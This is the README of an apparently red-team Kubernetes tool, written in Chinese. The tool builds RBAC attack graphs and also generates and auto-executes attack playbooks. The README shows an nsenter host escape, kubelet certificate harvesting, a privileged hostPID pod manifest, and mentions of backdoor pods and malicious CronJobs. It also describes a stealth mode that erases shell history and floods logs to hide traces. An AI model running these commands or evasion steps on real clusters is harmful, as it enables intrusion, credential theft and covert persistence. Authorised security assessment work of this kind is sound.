# K8s Arsenal — 攻击图状态机模拟器

**Kubernetes Permission Causal Analysis Engine** — 从 RBAC 绑定构建攻击图，模拟身份迁移与能力组合，分析边因果性与最小割集，推断攻击语义标签。

```
AttackGraph = (G, S, T, Δ, MCS, Label)
v0.4   Path reachability      — 攻击图基元（build_graph/reachable/shortest_path）
v0.5   State evolution        — 身份流 + 能力集沿路径演化
v0.5.1 T(S) terminal semantics — 三值终端状态：SAFE / PARTIAL / COMPROMISED
v0.6   ΔT counterfactual      — 单边因果分析（移除一条边是否改变终端状态）
v0.7   MCS minimal cut set     — 组合因果：打破所有攻击路径的最小边集合
v0.8   AttackLabel classifier  — 语义投影：从 trace 推导 MITRE 战术标签
v0.9   Architectural invariants — CI 门禁：18 个可执行设计约束
```

## 设计理念

**不依赖漏洞利用**，专注于**信任链劫持**——滥用 K8s 组件间固有信任关系。

v0.4 以前是攻击面评估工具（编目 72 攻击向量 + 可执行剧本）。v0.5 起转型为**攻击图状态机**：不枚举所有漏洞，而是模拟「给定初始身份 + 一组信任边，系统最终会沦陷到什么程度」。

- **因果性**：不是问"有没有路径"，而是问"为什么这个身份能到这里"
- **可解释性**：每条攻击链都有完整的 identity_chain + capability_trace
- **架构可验证**：18 个 invariants 配合 `pytest -m invariants` 自动拦截设计越界

## 版本表

| 版本 | 日期 | 关键变更 |
|------|------|----------|
| **v0.9.0** | 2026-06-13 | 🏛️ **Architectural Invariants** — 18 个可执行设计约束，`pytest -m invariants` CI 门禁 |
| **v0.8.0** | 2026-06-13 | 🏷️ **AttackLabel 分类器** — 5 tactic（PE/LM/CA/P/Exec），CLUSTER_TAKEOVER 移除（是终态非战术） |
| **v0.7.0** | 2026-06-13 | 🔪 **Minimal Cut Set** — 双轨 hitting-set（greedy+exact），发现最小断边集合 |
| **v0.6.0** | 2026-06-13 | ⚡ **Counterfactual ΔT** — 单边因果核：移除一条边，终端状态是否改变？ |
| **v0.5.1** | 2026-06-13 | 🎯 **T(S) 终端语义** — 三值决策：SAFE / PARTIAL / COMPROMISED |
| **v0.5.0** | 2026-06-13 | 🔗 **State Evolution** — identity_flow + capability_set + evaluate_path |
| **v0.4.x** | 2026-06-07 | 🎭 攻击面分析工具时代 — PlaybookExecutor、72 CVE 编目、Docker 镜像化 |
| **v0.3.0** | 2026-06-06 | 智能适应引擎 + 攻击向量优化器 + SmartAttackChain |

> 完整变更记录见 [CHANGELOG.md](CHANGELOG.md)

## 功能模块

| 模块 | 功能 | 版本 |
|------|------|------|
| **🔷 攻击图状态机层 (v0.4–v0.9)** |||
| `models.py` | **AttackGraph** 统一容器 — (G, S, T, Δ, MCS, Label) | v0.4.4 |
| `runtime/identity_flow.py` | 身份沿路径传播 — 只在 TokenAccess/Impersonate 边上跃迁 | v0.5.0 |
| `runtime/capability_set.py` | 能力沿路径累积 — resource/verb → token 映射 | v0.5.0 |
| `runtime/evaluator.py` | **T(S) 终端状态** — SAFE / PARTIAL / COMPROMISED 三值决策 | v0.5.1 |
| `runtime/counterfactual.py` | **ΔT 反事实核** — 单边因果分析 | v0.6.0 |
| `runtime/minimal_cut.py` | **MCS 最小割集** — 组合因果 hitting-set | v0.7.0 |
| `runtime/classifier.py` | **AttackLabel 语义投影** — 5 tactic 分类 | v0.8.0 |
| `runtime/invariants.py` | **可执行设计约束** — 18 个 invariants, CI 门禁 | v0.9.0 |
| **🔶 攻击面检测层 (v0.1–v0.4)** |||
| `recon` | K8s 环境探测、RBAC 分析、信任拓扑映射 | v0.1.0 |
| `core/engine` | 智能适应引擎 — 环境指纹识别、检测强度评估、攻击面评分 | v0.3.0 |
| `core/optimizer` | 攻击向量优化器 — 4 维评分、阶段排序、最优序列生成 | v0.3.0 |
| `escape` | 容器逃逸条件检测（hostPID/privileged/capabilities 等 12 项） | v0.1.0 |
| `persistence` | 持久化技术编目（TokenRequest/Webhook/CronJob/内核级 8 项） | v0.2.0 |
| `lateral` | 横向移动路径分析（Kubelet 证书/节点代理/Token 窃取 8 项） | v0.2.0 |
| `network` | 网络攻击面分析（CoreDNS/CNI/ServiceMesh/iptables 8 项） | v0.2.0 |
| `cloud` | 云平台利用链（AWS IRSA、GCP Workload Identity、Azure IMDS） | v0.2.0 |
| `evasion` | 检测逃逸技术编目（审计绕过/日志混淆/Falco 绕过 9 项） | v0.2.0 |
| `playbook/chains` | 攻击剧本生成（组合攻击链/加权评分/SmartAttackChain） | v0.2.0 |
| `playbook/executor` | 剧本执行器 — 可执行攻击命令 + 隐蔽模式 | v0.4.0 |
| `supply_chain` | 供应链攻击分析（Helm/镜像/Operator/GitOps 投毒 9 项） | v0.2.0 |
| `advanced` | 前沿 CVE 向量（runc/Docker/eBPF/containerd/Istio 等 18 项） | v0.2.0 |
| `utils` | Pod 内自检 / 多格式导出 / 性能监控与日志 | v0.2.0 |

## 安装

### 常规安装

```bash
# 从源码安装
pip install -e .

# 含云平台支持
pip install -e ".[cloud]"

# 含 lint 工具
pip install -e ".[lint]"

# 含测试
pip install -e ".[test]"
```

### Docker 镜像部署（推荐用于 Pod 内运行）

项目提供了 `Dockerfile` 用于构建包含 k8s-arsenal 及其依赖的 Docker 镜像：

```bash
# 构建镜像
docker build -t k8s-arsenal-pod:latest .

# 加载到 Minikube
minikube image load k8s-arsenal-pod:latest

# 创建测试 Pod（完整 manifest 见下方）
kubectl apply -f test-pod.yaml

# 进入 Pod 交互
kubectl exec -it test-pod -- bash

# 在 Pod 内验证
k8s-arsenal version
k8s-arsenal assess
k8s-arsenal recon --full
```

`Dockerfile` 基于 `python:3.11-slim`，预装 kubectl + curl + procps + net-tools + iproute2，镜像大小约 460MB。构建前需在项目根目录准备 `kubectl.bin`（从 minikube 容器复制或手动下载）。Pod manifest 见下文「部署 Pod 模板」。

```dockerfile
# Dockerfile — 基于 python:3.11-slim，预装 kubectl 和系统工具
FROM python:3.11-slim
WORKDIR /app

# 换 apt 源为清华镜像（国内加速）
RUN sed -i 's|http://deb.debian.org|https://mirrors.tuna.tsinghua.edu.cn|g' /etc/apt/sources.list.d/debian.sources && \
    apt-get update && apt-get install -y --no-install-recommends \
    ca-certificates curl procps net-tools iproute2 docker.io && \
    rm -rf /var/lib/apt/lists/*

# 从构建上下文复制 kubectl 二进制
COPY kubectl.bin /usr/local/bin/kubectl
RUN chmod +x /usr/local/bin/kubectl

# 安装 k8s-arsenal
COPY k8s_arsenal/ /app/k8s_arsenal/
COPY pyproject.toml /app/
RUN pip install --no-cache-dir /app/

CMD ["sleep", "infinity"]
```

### 部署 Pod 模板

```yaml
# test-pod.yaml — 特权容器，用于在 K8s 集群内运行 k8s-arsenal
apiVersion: v1
kind: Pod
metadata:
  name: test-pod
  namespace: default
spec:
  hostPID: true
  hostNetwork: true
  serviceAccountName: test-sa
  containers:
  - name: python
    image: k8s-arsenal-pod:latest
    imagePullPolicy: IfNotPresent
    securityContext:
      privileged: true
  restartPolicy: Always
```

> **注意：** `hostPID: true` 和 `privileged: true` 是为了 nsenter 宿主机逃逸测试。生产环境中请勿使用此配置。

## 快速开始

```bash
# 战场评估
k8s-arsenal assess              # 分析当前环境生成战场报告
k8s-arsenal assess --json       # JSON 格式输出

# 攻击向量优化
k8s-arsenal optimize            # 评分排序 + 最优链生成
k8s-arsenal optimize --compare  # 向量评分对比表
k8s-arsenal optimize --stealth  # 隐蔽优先模式

# 环境侦察
k8s-arsenal recon --full

# 逃逸条件检测
k8s-arsenal escape --check

# 列出所有攻击技术（支持工具内部名和 MITRE 阶段名）
k8s-arsenal catalog --phase all
k8s-arsenal catalog --phase escape              # 支持模块名别名
k8s-arsenal catalog --phase privilege_escalation # 也支持 MITRE 标准名

# 生成攻击剧本
k8s-arsenal playbook --entry "low-privilege-sa" --target "cluster-admin"

# 信任拓扑映射（v0.3.0 新增）
k8s-arsenal trust-map
k8s-arsenal trust-map --attackable  # 仅显示可被利用的信任边

# 导出报告
k8s-arsenal export --format html -o report.html

# Pod 内自检
k8s-arsenal self-check

# 交互模式
k8s-arsenal interactive

# ===== v0.4.0: 可执行攻击剧本 =====
k8s-arsenal playbook --list-commands              # 显示具体可执行的攻击命令
k8s-arsenal playbook --list-commands --stealth     # 隐蔽模式（插入痕迹清理步骤）
k8s-arsenal playbook --list-commands -o attack.sh  # 导出为 Shell 脚本
k8s-arsenal playbook --dry-run                     # ⚠️ 预览模式：模拟执行，不实际修改集群
k8s-arsenal playbook --run                         # ⚠️ 自动执行攻击剧本（会修改集群！先用 --list-commands 或 --dry-run 预览）
k8s-arsenal playbook --run --stealth               # 隐蔽模式自动执行
k8s-arsenal playbook --run --stealth -o report.json # 输出 JSON 执行报告
```

## v0.4.0 — 可执行攻击剧本

### 概述

**PlaybookExecutor** — 将攻击检测与评估结果转化为**具体的、可执行的攻击命令**。

与 v0.3.x 的评分链不同，PlaybookExecutor 不再仅输出「应该做什么」的分析建议，而是直接给出「怎么做」的 Shell 命令，并支持一键自动执行。

### 核心架构

```
playbook/executor.py  (817 行)
├── ExecutableStep         # 可执行攻击步骤（dataclass）
│   ├── step_number        # 步骤序号
│   ├── phase              # 攻击阶段（discovery/credential_access/...）
│   ├── command            # 具体 Shell 命令
│   ├── expected_outcome   # 预期结果
│   ├── risk_level         # 风险等级（low/medium/high/critical）
│   ├── detection_risk     # 检测风险
│   ├── cve                # 相关 CVE 编号
│   ├── alternative_commands # 替代命令列表
│   └── cleanup_command    # 痕迹清理命令
│
├── PlaybookExecution      # 完整攻击剧本（dataclass）
│   ├── to_text()          # 文本格式输出（终端展示）
│   ├── to_shell_script()  # Shell 脚本导出（可直接执行）
│   └── to_json()          # JSON 格式导出
│
└── PlaybookExecutor       # 剧本执行器（15 个方法）
    ├── __init__(profile)            # 接收环境画像（AdaptiveEngine 输出）
    ├── generate(stealth=False)      # 生成完整攻击剧本
    ├── execute(plan, dry_run=False) # 自动执行攻击步骤
    ├── _get_env_label()             # 获取环境标识（用于输出头）
    ├── _build_recon_steps()         # 侦察阶段步骤
    ├── _build_escape_steps()        # 容器逃逸步骤（调用 escape/detector）
    ├── _build_credential_steps()    # 凭证窃取步骤
    ├── _build_persistence_steps()   # 持久化步骤
    ├── _inject_cleanup_steps()      # 注入防御规避（痕迹清理）步骤
    ├── _get_vector_command()        # 从 _ESCAPE_COMMANDS 查找执行命令
    ├── _get_cleanup_for_vector()    # 从 _ESCAPE_COMMANDS 查找清理命令
    └── _ESCAPE_COMMANDS             # 逃逸命令映射表（11 组命令+清理二元组）
```

### 攻击步骤生成逻辑

PlaybookExecutor 根据环境画像自动生成 4 个阶段的攻击步骤：

```
攻击阶段                   触发条件
─────────────────────────────────────────
1. DISCOVERY            始终执行（SA token、API Server 可达性、命名空间）
2. PRIVESC/ESCAPE       hostPID=true 且 privileged=true（nsenter 逃逸等）
3. CREDENTIAL_ACCESS    mount 了 kubelet PKI 或存在高危 SA 权限
4. PERSISTENCE          特权容器或写权限（恶意 CronJob / DaemonSet 部署）
```

每个阶段的具体步骤根据 `escape/detector.py` 的检测结果动态生成。

### 隐蔽模式（--stealth）

开启 `--stealth` 后，PlaybookExecutor 在关键攻击步骤之后自动注入 3 个防御规避步骤：

| 步骤 | 命令 | 效果 |
|------|------|------|
| Shell 历史清理 | `history -c; rm -f ~/.bash_history; unset HISTFILE` | 清除当前 shell 命令记录 |
| 临时文件清理 | `rm -rf /tmp/*.sh /tmp/*.py /tmp/pwn* ... && sync` | 删除攻击过程中产生的文件 |
| 日志干扰（可选） | `logger "INFO: normal operation heartbeat $i"` | 在审计日志中生成大量正常消息掩盖攻击痕迹 |

**无 `--stealth` 时：** 输出 20 步攻击计划（不含防御规避步骤）  
**开启 `--stealth` 时：** 输出 29 步（含 3 个防御规避步骤，分布在关键操作后）

### 使用示例

```bash
# 查看当前环境对应的可执行攻击命令（20 步）
k8s-arsenal playbook --list-commands

# 隐蔽模式（29 步，插入痕迹清理）
k8s-arsenal playbook --list-commands --stealth

# 导出为 Shell 脚本
k8s-arsenal playbook --list-commands -o attack.sh
chmod +x attack.sh && ./attack.sh

# 自动执行
k8s-arsenal playbook --run

# 隐蔽模式自动执行
k8s-arsenal playbook --run --stealth

# JSON 格式输出
k8s-arsenal playbook --list-commands -o plan.json

# 传统智能链评估模式（v0.3.x 兼容）
k8s-arsenal playbook --smart
k8s-arsenal playbook --entry privileged-pod --target cluster-admin
```

### 攻击步骤输出示例

当在特权 Pod 内运行时：

```
╭────────────────╮
│ 攻击剧本生成器  │
╰────────────────╯
入口条件: low-privilege-sa
目标权限: cluster-admin
模式: 智能评分
  可执行模式: 仅显示命令
  隐蔽模式: 已开启
============================================================
  K8s Arsenal - 攻击剧本执行计划
  容器内 + K8s + hostPID + hostNet
============================================================
  生成时间: 2026-06-06 03:09:51
  总步数:   29
  预估耗时: 约 3 分钟

[1] DISCOVERY - 当前命名空间信息
    $ cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
    预期: default

[2] DISCOVERY - K8s API Server 可达性
    $ curl -k -s --connect-timeout 5 https://kubernetes.default.svc/healthz
    预期: ok

[3] PRIVESC - nsenter 宿主机逃逸
    $ nsenter -t 1 -m -u -i -n -p -- bash -c 'id'
    风险: high
    清理: history -c; rm -f /tmp/.bash_history

[4] CREDENTIAL_ACCESS - kubelet 凭证窃取
    $ find /var/lib/kubelet/pki/ -name '*.pem' 2>/dev/null
    风险: critical
    ...
```

### Bug 修复记录（v0.4.0）

PlaybookExecutor v0.4.0 开发与优化过程中修复了以下 bug：

| Bug | 位置 | 问题 | 修复 |
|-----|------|------|------|
| 类型错误 | `executor.py:820,854` | `defense_evasion_steps` 用 `{` 初始化（set）但 `ExecutableStep` 不可哈希 | 改为 `[` 初始化（list），关闭符从 `}` 改为 `]` |
| 括号不匹配 | `executor.py:189-202` | `report.to_dict()` 中 dict 末尾误写 `]` | 改为 `}` 正确关闭 dict |
| **Step 编号死代码清理** | `executor.py` `_build_*_steps()` 4 处 | `_build_recon/escape/credential/persistence_steps` 各自维护 `step_num/next_num()` 本地编号闭包，但 `generate()` 末尾统一编号会将其覆盖 | 移除 4 处 `step_num/next_num()` 死代码，统一由 `generate()` 末尾 `for i, step in enumerate(steps, 1): step.step_number = i` 一次完成（`_inject_cleanup_steps` 的编号逻辑因在统一编号之后执行，予以保留） |
| **命令映射三合一** | `executor.py` `_build_escape_steps()` + `_get_vector_command()` | `escape_phase_map`(dead code, 11 命令) + `cleanup_map`(6 项) + `_get_vector_command`(11 分支 if-else)，3 处散落映射表彼此重叠 | 合并为单一 `_ESCAPE_COMMANDS` 类常量（11 组 `(command, cleanup)` 元组），移除 `phase_map` 死参，新增 `_get_cleanup_for_vector()`；净减 ~90 行 |
| **子模块导出修复** | `k8s_arsenal/*/__init__.py` 7 处 | `advanced/evasion/lateral/network/persistence/supply_chain/utils` 的 `__init__.py` 仅有注释，不含任何导出（`cli.py` 虽可直接深度导入，但破坏模块封装性） | 每文件添加 `from X import Y` + `__all__ = [...]`，确保 `from k8s_arsenal.evasion import EVASION_VECTORS` 等导入链完整 |
| **死依赖清理** | `pyproject.toml` + `requirements.txt` | `jinja2` 和 `python-dateutil` 全项目零引用但声明于 2 处 | 从 `pyproject.toml` dependencies 和 `requirements.txt` 移除；`requirements.txt` 同时清理 BOM 字节 |
| **Shell 脚本安全加固** | `executor.py` `to_shell_script()` | `set -e` 不覆盖未定义变量和管道失败；`echo '  Command: {step.command}'` 中 step.command 含单引号时破坏 shell 语法 | 改为 `set -euo pipefail`；命令预览改为双引号 + 转义 `step.command.replace('"', '\\"')[:120]` |
| **阈值硬编码配置化** | `chains.py` `_block_loud_vectors()` | `len(v.detection_hints) >= 4` 中阈值 4 硬编码 | 改为 `self._detection_threshold` 类属性（默认 4），可在构造时传入 `SmartAttackChain(detection_threshold=3)` |
| **命令关键字误匹配（P0）** | `executor.py` `_get_vector_command()` / `_get_cleanup_for_vector()` | 关键词子串匹配（`key in vector.id.lower() or key in desc_lower`）导致 3 个向量返回 None（ESC-007/008/011），1 个返回错误命令（ESC-002 拿到 mount 而非 docker run） | 新增 `_VECTOR_ID_MAP` 直接 ID 映射表（ESC-001~012 → `_ESCAPE_COMMANDS` key）；新增 `device_mapper` / `core_patterns` 命令条目；`_get_vector_command/cleanup` 改为先查 ID 映射再回退描述 |
| **自检身份字段为空（P0）** | `utils/self_check.py` `_build_report()` | `_check_identity()` 已从环境变量 + SA token 文件解析出 ns/sa/node/pod 但未存储，`_build_report()` 直接用 `os.environ.get()` 读取——Pod 未配置 Downward API 时身份字段全空 | `_check_identity()` 解析后存入 `self._identity_ns/sa/node/pod` 实例属性；`_build_report()` 优先使用实例属性，仅回退到 `os.environ.get()` |

## 核心架构

```
k8s_arsenal/
├── Dockerfile                 # Docker 镜像构建（python:3.11-slim）
├── pyproject.toml             # 项目元数据与依赖
├── README.md                  # 本文档
├── CHANGELOG.md               # 变更记录
├── k8s_arsenal/
│   ├── __init__.py            # 版本号 (v0.9.0)
│   ├── models.py              # 核心数据模型（AttackGraph, TrustEdge 等）
│   ├── cli.py                 # CLI 入口
│   ├── runtime/               # 🔷 攻击图状态机层 (v0.5–v0.9)
│   │   ├── __init__.py        # 36 exports
│   │   ├── identity_flow.py   # 身份沿路径传播
│   │   ├── capability_set.py  # 能力沿路径累积
│   │   ├── evaluator.py       # T(S) 终端状态决策
│   │   ├── counterfactual.py  # ΔT 单边因果分析
│   │   ├── minimal_cut.py     # MCS 最小割集
│   │   ├── classifier.py      # AttackLabel 语义投影
│   │   └── invariants.py      # 18 个可执行设计约束
│   ├── core/                  # 🔶 攻击面检测层 (v0.3)
│   │   ├── engine.py          # 自适应战场评估（AdaptiveEngine）
│   │   └── optimizer.py       # 攻击向量优化器（AttackVectorOptimizer）
│   ├── recon/                 # 环境侦察
│   │   ├── k8s_enum.py        # K8s 环境探测
│   │   ├── trust_map.py       # 信任拓扑映射
│   │   └── sa_analysis.py     # ServiceAccount 权限分析
│   ├── escape/detector.py     # 容器逃逸条件检测
│   ├── persistence/           # 持久化（8 项）
│   ├── lateral/               # 横向移动（8 项）
│   ├── network/               # 网络攻击（8 项）
│   ├── cloud/                 # 云平台（AWS/GCP/Azure）
│   ├── evasion/               # 检测逃逸（9 项）
│   ├── playbook/
│   │   ├── chains.py          # 攻击链组合引擎
│   │   └── executor.py        # 剧本执行器
│   ├── supply_chain/          # 供应链攻击（9 项）
│   ├── advanced/              # 前沿 CVE 向量（18 项）
│   └── utils/                 # 工具集
└── tests/
    ├── test_runtime.py        # 25 条 (identity/capability/eval/T(S))
    ├── test_counterfactual.py # 20 条 (ΔT 因果核)
    ├── test_minimal_cut.py    # 20 条 (MCS 割集)
    ├── test_classifier.py     # 11 条 (AttackLabel/tactic)
    ├── test_invariants.py     # 32 条 (pytest -m invariants)
    ├── test_models.py         # 20 条 (AttackGraph/图基元)
    ├── test_executor.py       # 30 条 (PlaybookExecutor)
    ├── test_engine.py         # 18 条 (AdaptiveEngine)
    ├── test_optimizer.py      # 19 条 (Optimizer)
    ├── test_chains.py         # 20 条 (Chains)
    ├── test_catalogs.py       # 21 条 (Catalog)
    ├── test_smart_chain.py    # 19 条 (SmartChain)
    ├── test_detector.py       # 19 条 (Detector)
    ├── test_k8s_enum.py       # 19 条 (K8s enum)
    ├── test_sa_analysis.py    # 15 条 (SA analysis)
    └── test_trust_map.py      # 12 条 (Trust map)
```

## CLI 命令一览

| 命令 | 功能 | 版本 | 新增选项（v0.4.0） |
|------|------|------|------------------|
| `assess` | 战场评估（环境指纹 + 检测强度 + 攻击面评分） | v0.3.0 | — |
| `optimize` | 攻击向量评分排序 + 最优链生成 | v0.3.0 | — |
| `recon` | 环境侦察 + RBAC + 信任拓扑 | v0.1.0 | — |
| `trust-map` | **信任拓扑映射**（信任边列表及风险等级） | **v0.3.0** | — |
| `escape` | 容器逃逸条件检测 | v0.1.0 | — |
| `catalog` | 技术编目浏览（含高级 CVE） | v0.2.0 | — |
| `playbook` | 攻击剧本生成 + 可执行命令 + 自动执行 | v0.2.0 | `--run`, `--stealth`, `--list-commands`, `--output` |
| `export` | 多格式导出 | v0.2.0 | — |
| `self-check` | Pod 内自治扫描 | v0.2.0 | — |
| `interactive` | 交互式命令行模式 | v0.3.0 | — |

### playbook 命令完整参数

```
--entry TEXT             入口条件（默认: low-privilege-sa）
--target TEXT            目标权限（默认: cluster-admin）
--smart / --classic      使用智能评分链（默认: 是）
--run                    自动执行攻击剧本（v0.4.0）
--stealth                隐蔽模式，插入痕迹清理步骤（v0.4.0）
--list-commands          仅显示可执行命令，不生成分析报告（v0.4.0）
--dry-run                 预览模式：模拟执行，不实际修改集群（v0.4.0）
--output, -o PATH        保存到文件（.txt / .sh / .json）（v0.4.0）
```

## 攻击向量 & 分析模块统计

| 类别 | 数量 |
|------|------|
| **🔷 攻击图状态机** (`runtime/`) | **9 模块** (models + 5 核心 + classifier + invariants) |
| 容器逃逸 (`escape/vectors.py`) | 12 |
| 持久化 (`persistence/`) | 8 |
| 横向移动 (`lateral/`) | 8 |
| 网络攻击 (`network/`) | 8 |
| 供应链攻击 (`supply_chain/`) | 9 |
| 检测逃逸 (`evasion/`) | 9 |
| 高级 CVE (`advanced/`) | 18 |
| **攻击向量总计** | **72** |
| 攻击剧本模板 | 6 |
| **Invariants** | **18** |
| **总 exports** | **36** (runtime/__init__.py) |

## 测试覆盖

**总测试用例: 387**（384 passed, 3 skipped, 0 failed）— pytest 6.25s, 16ms/test

### Attack Graph State Machine 测试 (v0.5–v0.9)

| 测试文件 | 测试数 | 覆盖内容 |
|---------|--------|----------|
| `tests/test_runtime.py` | 25 | identity_flow, capability_set, evaluate_path, evaluate_terminal_state |
| `tests/test_counterfactual.py` | 20 | ΔT 反事实核: 4 结果类型, 终端状态转换, 图不变性 |
| `tests/test_minimal_cut.py` | 20 | MCS: greedy/exact hitting-set, 割集正确性, 边数量边界 |
| `tests/test_classifier.py` | 11 | AttackLabel: 5 tactic label, outcome 分离, 置信度 |
| `tests/test_invariants.py` | 32 | 🏛️ invariants: 18 设计约束 (pytest -m invariants) |
| `tests/test_models.py` | 20 | AttackGraph, TrustEdge, 图基元 (build_graph/reachable/shortest_path) |

### Attack Surface Application 测试 (v0.1–v0.4)

| 测试文件 | 测试数 | 覆盖内容 |
|---------|--------|----------|
| `tests/test_executor.py` | 30 | PlaybookExecutor: 生成/编号/脚本导出/dry-run |
| `tests/test_smart_chain.py` | 19 | SmartAttackChain 智能链生成、反馈机制 |
| `tests/test_optimizer.py` | 19 | AttackVectorOptimizer 评分排序、对比表 |
| `tests/test_engine.py` | 18 | AdaptiveEngine 环境评估、攻击面评分 |
| `tests/test_catalogs.py` | 21 | 技术编目、CLI 输出 |
| `tests/test_chains.py` | 20 | AttackChainBuilder 链生成、模板匹配 |
| `tests/test_detector.py` | 19 | 逃逸条件评估、检测精度、风险评分 |
| `tests/test_k8s_enum.py` | 19 | 容器/K8s 环境探测、特权检测、能力枚举 |
| `tests/test_sa_analysis.py` | 15 | ServiceAccount 权限风险评估 |
| `tests/test_trust_map.py` | 12 | 信任拓扑构建、可攻击边筛选 |

### CI Gate

```bash
pytest -m invariants   # 仅运行可执行设计约束 (32 tests)
pytest                 # 全量 387 tests
```

## 智能适应引擎 (v0.3.0)

```
AdaptiveEngine
├── 环境指纹识别   → "containerized|k8s|privileged|hostPID|docker-sock|caps:..."
├── 检测强度评估   → LOW / MEDIUM / HIGH / CRITICAL
├── 攻击面评分     → 0-100 (基于特权/挂载/SA权限/capabilities)
├── 靶场判别       → 自动识别 CTF/靶场 vs 企业环境
└── 策略输出       → 动态权重 + 规避建议 + 阶段优先级
```

## 攻击向量优化器 (v0.3.0)

```
AttackVectorOptimizer
├── 4维评分: success(0.35) + stealth(0.30) + speed(0.15) + impact(0.20)
├── 阶段分组排序 (prioritize_by_phase)
├── 最优序列生成 (optimize_sequence)
└── 对比表输出 (compare_vectors)
```

权重由 `AdaptiveEngine` 根据环境动态调整：
- 靶场 → 成功 + 速度优先
- 高检测 → 隐蔽性优先
- 企业环境 → 平衡模式

## 本地 K8s 靶场搭建

推荐使用 Minikube + Docker Desktop 搭建本地测试环境，项目已通过以下配置验证：

| 组件 | 版本 |
|------|------|
| Windows | 11 Home 25H2 |
| Docker Desktop | 4.76.0（推荐汉化: asxez/DockerDesktop-CN） |
| Minikube | v1.38.1 |
| Kubernetes | v1.35.1 |
| kicbase 镜像 | v0.0.50 |
| Python | 3.11 |

### 一键开关机

```powershell
# 启动（在项目根目录 D:\5555555 下执行）
minikube start --memory=7000m --driver=docker
minikube image load k8s-arsenal-pod:latest
kubectl delete pod test-pod --force --grace-period=0
kubectl apply -f test-pod.yaml
kubectl wait --for=condition=Ready pod/test-pod --timeout=60s
kubectl exec test-pod -- k8s-arsenal version

# 停止
minikube stop
```

## 文档

- [使用示例](docs/examples.md) - 常见使用场景和输出示例
- [最佳实践](docs/best-practices.md) - 安全评估工作流建议
- [故障排查](docs/troubleshooting.md) - 常见问题与解决方案

## 兼容性

- Python 3.10+
- 非容器环境可用所有离线编目功能（assess 评分较低）
- K8s 集群内自动加载 ServiceAccount 凭证
- 支持 kubeconfig 显式指定
- Docker Desktop 4.x（建议 4.70+）
- Minikube v1.35+

## 已知问题 / 注意事项

1. **Pod 容器重启后 /tmp 文件丢失**：test-pod 容器文件系统为临时存储，`kubectl cp` 传送的文件在重启后会丢失。建议使用 Docker 镜像方式部署（见上方 Dockerfile）。
2. **PowerShell 管道编码**：Windows PowerShell 通过 `| kubectl exec -i` 传输代码时可能损坏 UTF-8 编码，建议使用 base64 编码传输或直接部署 Docker 镜像。
3. **Docker 构建缓存**：`docker build` 后 `minikube image load` 可能不会覆盖旧镜像（tag 同名时跳过）。必须先用 `minikube ssh -- docker rmi k8s-arsenal-pod:latest` 删除旧镜像，再重新加载。
4. **恶意资源依赖**：`malicious-job`（CronJob）依赖 `busybox` 镜像，国内加速器可能拉取失败。
5. **后门 Pod 默认镜像**：`--run` 模式的后门 Pod 默认使用 `k8s-arsenal-pod:latest`（本地镜像），如需 nginx 等外部镜像请手动替换命令。
6. **CRI Socket 逃逸**：若节点使用 containerd（非 Docker），`docker run --privileged --pid=host` 会报 `docker: not found`。已预装 `docker.io` 包，也可手动替换为 `crictl run`。

## 免责声明

本工具仅用于授权的安全评估、红蓝对抗演练及安全研究。使用者需自行承担合规责任。﻿